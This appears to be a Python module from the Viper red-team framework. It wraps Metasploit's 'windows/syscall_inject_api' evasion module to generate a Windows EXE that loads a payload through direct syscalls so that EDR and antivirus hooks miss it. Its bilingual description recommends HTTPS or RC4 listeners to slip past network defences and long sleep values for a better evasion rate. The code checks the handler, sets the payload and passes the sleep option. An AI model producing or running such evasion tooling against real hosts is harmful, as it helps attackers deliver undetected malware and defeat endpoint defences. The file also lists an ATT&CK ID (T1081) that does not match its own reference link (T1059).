# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "直接windows系统调用规避技术"
    DESC_ZH = """此模块允许您生成规避基于主机(终端)的安全产品，如EDR/AVs.\n
模块使用直接windows系统调用以实现隐蔽性.\n并避免EDR hook.请使用HTTPS及RC4类型监听,以规避流量检测设备.\n
注意：为了提高规避几率，建议使用高睡眠值."""

    NAME_EN = "Direct windows syscall evasion technique"
    DESC_EN = """This module allows you to generate a Windows EXE that evades Host-based security products such as EDR/AVs. \n
It uses direct windows syscalls to achieve stealthiness, and avoid EDR hooking. \n
please try to use payloads that use a more secure transfer channel such as HTTPS or RC4 in order to avoid payload's network traffic getting caught by network defense mechanisms. \n
NOTE: for better evasion ratio, use high SLEEP values"""

    MODULETYPE = TAG2TYPE.Execution
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1081"]  # ATTCK向量
    REFERENCES = ["https://attack.mitre.org/techniques/T1059/"]
    README = ["https://www.yuque.com/vipersec/module/gkm65g"]
    AUTHOR = ["Viper"]
    OPTIONS = register_options([
        OptionHander(),
        OptionInt(name='SLEEP',
                  tag_zh="等待时间", desc_zh="加载shellcode前等待时间",
                  tag_en="Waiting time", desc_en="Wait time before load shellcode",
                  default=20),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "evasion"
        self.mname = "windows/syscall_inject_api"

    def check(self):
        """执行前的检查函数"""
        payload = self.get_handler_payload()
        if "windows" not in payload:
            return False, "选择handler错误,请选择windows平台的监听", "Select the handler error, please select the handler of the windows platform"
        if "x64" not in payload:
            return False, "选择handler错误,请选择x64类型监听", "Select the handler error, please select the handler of x64"
        self.set_payload_by_handler()
        self.set_msf_option("SLEEP", self.param("SLEEP") * 1000)
        return True, None

    def callback(self, status, message, data):
        if status is not True:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
            return

        self.log_good(f"模块运行完成,可执行文件: {data}", f"Module runs finish, the executable file :{data}")
